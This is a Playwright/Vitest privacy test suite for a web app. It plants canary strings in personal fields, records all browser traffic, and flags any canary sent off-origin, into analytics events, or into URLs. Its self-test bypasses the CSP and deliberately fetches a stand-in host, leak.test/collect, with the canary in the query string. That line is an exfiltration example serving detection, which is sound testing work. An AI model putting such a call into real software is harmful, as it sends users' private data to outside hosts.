/**
 * G-P, web (docs/blueprint/BLUEPRINT.md §14, docs/gates.md): the built
 * apps/app against apps/server. Canaries go into personal fields; every
 * request the browser makes is intercepted. Fails if a canary reaches any
 * host but the server origin, appears in a /v1/events payload (events are
 * content-free) or in any URL (blueprint §13: no content in URLs).
 *
 * Selectors stay few and role-based because the UI is changing (W3).
 */
import { chromium, type Browser, type BrowserContext, type Page } from 'playwright';
import { afterAll, beforeAll, expect, it } from 'vitest';
import { APP_DIST, builtAppOrigin, canary, completeFirstRun, startFront, startServer } from './harness.ts';

type Seen = { url: string; body: string; headers: string };

let server: Awaited<ReturnType<typeof startServer>>;
let front: Awaited<ReturnType<typeof startFront>>;
let browser: Browser;
let origin: string;

beforeAll(async () => {
  const listen = await builtAppOrigin();
  server = await startServer();
  front = await startFront({ upstream: server.url, listen, staticDir: APP_DIST });
  origin = front.origin;
  browser = await chromium.launch();
});

afterAll(async () => {
  await browser?.close();
  await front?.close();
  server?.stop();
});

/** A context that records every request (HTTP and WebSocket) and blocks those to other hosts. */
async function recorded(opts: { bypassCSP?: boolean } = {}): Promise<{ context: BrowserContext; seen: Seen[] }> {
  const context = await browser.newContext({ permissions: ['clipboard-read', 'clipboard-write'], bypassCSP: opts.bypassCSP ?? false });
  const seen: Seen[] = [];
  await context.route('**/*', async (route) => {
    const req = route.request();
    seen.push({ url: req.url(), body: req.postData() ?? '', headers: JSON.stringify(await req.allHeaders()) });
    if (new URL(req.url()).origin === origin) await route.continue();
    else await route.abort('blockedbyclient');
  });
  context.on('page', (page) =>
    page.on('websocket', (ws) => {
      seen.push({ url: ws.url(), body: '', headers: '' });
      ws.on('framesent', (f) => seen.push({ url: ws.url(), body: String(f.payload), headers: '' }));
    }),
  );
  return { context, seen };
}

/** Every way a canary got out. */
function leaks(seen: Seen[], canaries: string[]): string[] {
  const found: string[] = [];
  for (const r of seen) {
    const url = new URL(r.url);
    for (const c of canaries) {
      const where = [r.url.includes(c) && 'URL', r.headers.includes(c) && 'headers', r.body.includes(c) && 'body'].filter(Boolean).join(', ');
      if (!where) continue;
      if (url.origin !== origin) found.push(`${c} sent to ${url.origin} (${where}): ${r.url}`);
      else if (url.pathname.startsWith('/v1/events')) found.push(`${c} in a /v1/events payload: events must be content-free`);
      else if (r.url.includes(c)) found.push(`${c} in a URL: ${r.url}`);
    }
  }
  return found;
}

/** Type an ask into the capture field and draft it. Resolves once /v1/forge has answered. */
async function draft(page: Page, text: string) {
  const ask = page.getByRole('textbox').first();
  await ask.fill(text);
  const forged = page.waitForResponse((r) => new URL(r.url()).pathname === '/v1/forge');
  await ask.press('ControlOrMeta+Enter');
  expect((await forged).ok(), '/v1/forge failed').toBe(true);
}

/** Copy the draft if the page offers it, then leave so any queued events flush (pagehide). */
async function finish(page: Page) {
  const copy = page.getByRole('button', { name: /copy/i }).first();
  if (await copy.isVisible()) await copy.click();
  await page.waitForLoadState('networkidle');
  await page.goto('about:blank');
}

it('a typed brief reaches only the server, and never an event or a URL', async () => {
  const { context, seen } = await recorded();
  const secret = canary('brief');
  try {
    const page = await context.newPage();
    await page.goto(`${origin}/`);
    await completeFirstRun(page);
    await draft(page, `write a launch email for ${secret} in Claude`);
    await finish(page);
  } finally {
    await context.close();
  }
  // The canary must have been seen going to the server, or the journey tested nothing.
  expect(seen.some((r) => new URL(r.url).pathname === '/v1/forge' && r.body.includes(secret)), 'the brief never reached /v1/forge').toBe(true);
  expect(leaks(seen, [secret])).toEqual([]);
});

it('catches a leak (self-test: the page sends a canary out on purpose)', async () => {
  // The app's CSP would block the foreign request in the browser, so it is bypassed here.
  const { context, seen } = await recorded({ bypassCSP: true });
  const secret = canary('selftest');
  try {
    const page = await context.newPage();
    await page.goto(`${origin}/`);
    await page.evaluate(async (c) => {
      await fetch(`http://leak.test/collect?c=${c}`).catch(() => {});
      const event = { id: crypto.randomUUID(), type: 'brief.copied', at: new Date().toISOString(), props: { text: c } };
      await fetch('/v1/events', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ events: [event] }) });
    }, secret);
  } finally {
    await context.close();
  }
  expect(leaks(seen, [secret])).toEqual([
    `${secret} sent to http://leak.test (URL): http://leak.test/collect?c=${secret}`,
    `${secret} in a /v1/events payload: events must be content-free`,
  ]);
});

it('memory text reaches only the server, and never an event or a URL', async (ctx) => {
  const { context, seen } = await recorded();
  const secret = canary('memory');
  try {
    const page = await context.newPage();
    await page.goto(`${origin}/`);
    await completeFirstRun(page);
    const memory = page.getByRole('textbox', { name: /memor|remember/i });
    if ((await memory.count()) === 0) {
      ctx.skip('the app has no memory field yet (W3); extend this journey when it lands');
      return;
    }
    await memory.first().fill(secret);
    await memory.first().press('Enter');
    await page.waitForLoadState('networkidle');
    await draft(page, 'write a launch email in Claude');
    await finish(page);
  } finally {
    await context.close();
  }
  expect(leaks(seen, [secret])).toEqual([]);
});
